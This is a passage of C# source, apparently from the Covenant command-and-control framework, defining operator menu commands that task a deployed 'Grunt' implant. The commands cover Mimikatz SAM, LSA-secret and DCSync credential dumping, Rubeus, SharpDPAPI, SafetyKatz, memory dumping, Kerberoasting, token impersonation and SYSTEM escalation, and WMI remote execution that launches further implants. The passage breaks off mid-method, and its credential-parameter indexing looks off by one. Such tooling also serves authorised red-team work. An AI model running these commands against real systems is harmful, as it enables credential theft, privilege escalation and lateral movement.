        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: SamDump");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command lsadump::sam");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractLsaSecrets : MenuCommand
    {
        public MenuCommandGruntInteractLsaSecrets()
        {
            this.Name = "LsaSecrets";
            this.Description = "Execute the Mimikatz command \"lsadump::secrets\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: LsaSecrets");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command lsadump::secrets");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractDCSync : MenuCommand
    {
        public MenuCommandGruntInteractDCSync()
        {
            this.Name = "DCSync";
            this.Description = "Execute the Mimikatz command \"lsadump::dcsync\".";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "User" },
                new MenuCommandParameter { Name = "FQDN" },
                new MenuCommandParameter { Name = "DC" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || commands.Count() > 4)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: DCSync <user> [<fqdn>] [<dc>]");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });

                string command = "\"lsadump::dcsync";
                if (commands[1].ToLower() == "all")
                {
                    command += " /all";
                }
                else
                {
                    command += " /user:" + commands[1];
                }
                if (commands.Count() > 2)
                {
                    command += " /domain:" + commands[2];
                }
                if (commands.Count() > 3)
                {
                    command += " /dc:" + commands[3];
                }
                command += "\"";
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + command);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRubeus : MenuCommand
    {
        public MenuCommandGruntInteractRubeus()
        {
            this.Name = "Rubeus";
            this.Description = "Use a Rubeus command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a Rubeus command.");
                EliteConsole.PrintFormattedErrorLine("Usage: Rubeus <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Rubeus" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSharpDPAPI : MenuCommand
    {
        public MenuCommandGruntInteractSharpDPAPI()
        {
            this.Name = "SharpDPAPI";
            this.Description = "Use a SharpDPAPI command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a SharpDPAPI command.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpDPAPI <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "SharpDPAPI" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSharpUp : MenuCommand
    {
        public MenuCommandGruntInteractSharpUp()
        {
            this.Name = "SharpUp";
            this.Description = "Use a SharpUp command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a SharpUp command.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpUp <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "SharpUp" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSafetyKatz : MenuCommand
    {
        public MenuCommandGruntInteractSafetyKatz()
        {
            this.Name = "SafetyKatz";
            this.Description = "Use SafetyKatz.";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: SafetyKatz");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "SafetyKatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSharpDump : MenuCommand
    {
        public MenuCommandGruntInteractSharpDump()
        {
            this.Name = "SharpDump";
            this.Description = "Use a SharpDump command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ProcessID" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a ProcessID.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpDump <process_id>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "SharpDump" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSharpWMI : MenuCommand
    {
        public MenuCommandGruntInteractSharpWMI()
        {
            this.Name = "SharpWMI";
            this.Description = "Use a SharpWMI command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a SharpWMI command.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpWMI <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "SharpWMI" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractKerberoast : MenuCommand
    {
        public MenuCommandGruntInteractKerberoast()
        {
            this.Name = "Kerberoast";
            this.Description = "Perform a \"kerberoasting\" attack to retreive crackable SPN tickets.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Usernames" },
                new MenuCommandParameter { Name = "Hash Format" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
            }
            else
            {
                string usernames = null;
                string format = "Hashcat";
                if (commands.Count() > 1)
                {
                    if (commands.Count() == 2)
                    {
                        if (commands[1].ToLower() == "hashcat" || commands[1].ToLower() == "john")
                        {
                            format = commands[1];
                        }
                        else
                        {
                            usernames = commands[1];
                        }
                    }
                    else if (commands.Count() == 3)
                    {
                        usernames = commands[1];
                        if (commands[2].ToLower() == "hashcat" || commands[2].ToLower() == "john")
                        {
                            format = commands[2];
                        }
                        else
                        {
                            EliteConsole.PrintFormattedErrorLine("Hash Format must be either \"Hashcat\" or \"John\"");
                            EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
                        }
                    }
                    else
                    {
                        EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
                    }
                }
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Kerberoast" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Usernames " + usernames);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set HashFormat " + format);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetDomainUser : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainUser()
        {
            this.Name = "GetDomainUser";
            this.Description = "Gets a list of specified (or all) user `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainUser <identities>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetDomainUser" });

                if (commands.Count == 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetDomainGroup : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainGroup()
        {
            this.Name = "GetDomainGroup";
            this.Description = "Gets a list of specified (or all) group `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainGroup <identities>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetDomainGroup" });

                if (commands.Count == 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetDomainComputer : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainComputer()
        {
            this.Name = "GetDomainComputer";
            this.Description = "Gets a list of specified (or all) computer `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainComputer <identities>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetDomainComputer" });

                if (commands.Count == 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetLocalGroup : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLocalGroup()
        {
            this.Name = "GetNetLocalGroup";
            this.Description = "Gets a list of `LocalGroup`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLocalGroup <computernames>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetLocalGroup" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetLocalGroupMember : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLocalGroupMember()
        {
            this.Name = "GetNetLocalGroupMember";
            this.Description = "Gets a list of `LocalGroupMember`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" },
                new MenuCommandParameter { Name = "LocalGroup" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLocalGroupMember <computernames> <localgroup>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetLocalGroupMember" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LocalGroup " + commands[2]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetLoggedOnUser : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLoggedOnUser()
        {
            this.Name = "GetNetLoggedOnUser";
            this.Description = "Gets a list of `LoggedOnUser`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLoggedOnUser <computernames>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetLoggedOnUser" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetSession : MenuCommand
    {
        public MenuCommandGruntInteractGetNetSession()
        {
            this.Name = "GetNetSession";
            this.Description = "Gets a list of `SessionInfo`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetSession <computernames>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetSession" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractImpersonateUser : MenuCommand
    {
        public MenuCommandGruntInteractImpersonateUser()
        {
            this.Name = "ImpersonateUser";
            this.Description = "Find a process owned by the specified user and impersonate the token. Used to execute subsequent commands as the specified user.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Username" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ImpersonateUser <username>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ImpersonateUser" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractImpersonateProcess : MenuCommand
    {
        public MenuCommandGruntInteractImpersonateProcess()
        {
            this.Name = "ImpersonateProcess";
            this.Description = "Impersonate the token of the specified process. Used to execute subsequent commands as the user associated with the token of the specified process.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ProcessID" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ImpersonateProcess <processid>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ImpersonateProcess" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ProcessID " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetSystem : MenuCommand
    {
        public MenuCommandGruntInteractGetSystem()
        {
            this.Name = "GetSystem";
            this.Description = "Impersonate the SYSTEM user. Equates to ImpersonateUser(\"NT AUTHORITY\\SYSTEM\").";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetSystem");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetSystem" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractMakeToken : MenuCommand
    {
        public MenuCommandGruntInteractMakeToken()
        {
            this.Name = "MakeToken";
            this.Description = "Makes a new token with a specified username and password, and impersonates it to conduct future actions as the specified user.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Domain" },
                new MenuCommandParameter { Name = "Password" },
                new MenuCommandParameter { Name = "LogonType" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 4 || commands.Count() > 5)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: MakeToken <username> <domain> <password> <logontype>");
            }
            else
            {
                string username = "username";
                string domain = "domain";
                string password = "password";
                string logontype = "LOGON32_LOGON_NEW_CREDENTIALS";
                if (commands.Count() > 1) { username = commands[1]; }
                if (commands.Count() > 2) { domain = commands[2]; }
                if (commands.Count() > 3) { password = commands[3]; }
                if (commands.Count() > 4) { logontype = commands[4]; }
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "MakeToken" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + username);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Domain " + domain);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + password);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LogonType " + logontype);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRevertToSelf : MenuCommand
    {
        public MenuCommandGruntInteractRevertToSelf()
        {
            this.Name = "RevertToSelf";
            this.Description = "Ends the impersonation of any token, reverting back to the initial token associated with the current process. Useful in conjuction with functions that impersonate a token and do not automatically RevertToSelf, such as: ImpersonateUser(), ImpersonateProcess(), GetSystem(), and MakeToken().";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: RevertToSelf");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "RevertToSelf" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractWMICommand : MenuCommand
    {
        public MenuCommandGruntInteractWMICommand()
        {
            this.Name = "WMICommand";
            this.Description = "Execute a process on a remote system using Win32_Process Create, optionally with alternate credentials.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Command" },
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Password" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: wmicommand <computername> <command> [ <username> <password> ]");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "WMICommand" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + commands[2]);

                // TODO: Parsing bug, what if command has a space?
                if (commands.Count() == 5)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[2]);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + commands[3]);
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Username");
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Password");
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractWMIGrunt : MenuCommand
    {
        public MenuCommandGruntInteractWMIGrunt()
        {
            this.Name = "WMIGrunt";
            this.Description = "Execute a Grunt Launcher on a remote system using Win32_Process Create, optionally with alternate credentials.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Launcher" },
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Password" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3 && commands.Count() != 5)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: wmigrunt <computername> <launcher> [ <username> <password> ]");
            }
            else
            {
                try
                {
                    List<string> launchers = menuItem.CovenantClient.ApiLaunchersGet().Select(L => L.Name.ToLower()).ToList();
                    if (!launchers.Contains(commands[2].ToLower()))
                    {
                        EliteConsole.PrintFormattedErrorLine("Invalid Launcher name: \"" + commands[2] + "\" specified. Valid Launchers: " + String.Join(",", launchers));
                        EliteConsole.PrintFormattedErrorLine("Usage: wmigrunt <computername> <launcher> [ <username> <password> ]");
                    }
                    else
                    {
                        GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                        TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                        task.ValidateMenuParameters(new string[] { "WMIGrunt" });

                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[2]);
                        if (commands.Count() == 5)
                        {
                            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[2]);
                            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + commands[3]);
                        }
                        else
                        {
                            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Username");
